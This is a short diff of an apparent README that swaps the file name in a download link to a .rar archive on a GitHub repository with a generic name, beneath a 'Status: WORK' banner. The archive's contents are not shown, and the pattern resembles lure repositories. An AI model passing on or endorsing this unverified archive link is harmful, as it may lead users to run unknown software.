@@ -4,4 +4,4 @@
 > # 🟢Status:WORK🟢
 ---
 # Download
-### [Download the latest version](https://github.com/nadinemrtwix/scaling-umbrella/releases/download/v1.61/GHUBSProject.rar)
+### [Download the latest version](https://github.com/nadinemrtwix/scaling-umbrella/releases/download/v1.61/GitHUBSProject.rar)
